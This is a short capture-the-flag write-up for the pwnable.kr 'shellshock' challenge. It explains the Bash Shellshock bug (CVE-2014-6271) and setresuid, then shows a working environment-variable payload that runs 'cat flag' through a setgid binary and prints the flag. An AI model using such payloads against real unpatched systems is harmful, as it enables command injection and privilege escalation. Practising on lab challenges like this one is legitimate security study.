# Pwnable.kr - shellshock
* [CVE 2014-6721](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271)
    * **shellshock** : Vulnerability in Bash Shell which allows the execution of arbitrary command through environment variable.
        ```bash
            $ env t=4 bash -c 'echo $t'
            4
            $ env t='() { :; };echo hello' ./shellshock
            hello
            shock_me
        ```
* [setresuid, setresgid](https://man7.org/linux/man-pages/man2/setresuid.2.html#:~:text=setresuid()%20sets%20the%20real,saved%20set%2Duser%2DID.)
    ```c
        int setresuid(uid_t ruid, uid_t euid, uid_t suid);  
        /*
        sets the reauser ID, the effective user ID, and the saved   set-user-ID of the calling process.
        */
        int setresgid(gid_t rgid, gid_t egid, gid_t sgid);  
        /*
        sets the real GID, effective GID, and saved set-group-ID of the calling process (and always modifies the filesystem GID to be the same as  the effective GID), with the same restrictions for unprivileged processes.
        */
    ```

* [env (Linux commnad)](https://man7.org/linux/man-pages/man1/env.1.html) : run a program in a modified envirnoment

# Pwn
```bash
    shellshock@pwnable:~$ ls -l
    total 960
    -r-xr-xr-x 1 root shellshock     959120 Oct 12  2014 bash
    -r--r----- 1 root shellshock_pwn     47 Oct 12  2014 flag
    -r-xr-sr-x 1 root shellshock_pwn   8547 Oct 12  2014 shellshock
    -r--r--r-- 1 root root              188 Oct 12  2014 shellshock.c
    shellshock@pwnable:~$ ./bash --version
    GNU bash, version 4.2.25(1)-release (x86_64-pc-linux-gnu)
    Copyright (C) 2011 Free Software Foundation, Inc.
    License GPLv3+: GNU GPL version 3 or later
    <http://gnu.org/licenses/gpl.html>

    This is free software; you are free to change and redistribute it.
    There is NO WARRANTY, to the extent permitted by law.
    shellshock@pwnable:~$ env t='() { :; };cat flag' ./shellshock
    only if I knew CVE-2014-6271 ten years ago..!!
    Segmentation fault (core dumped)
```

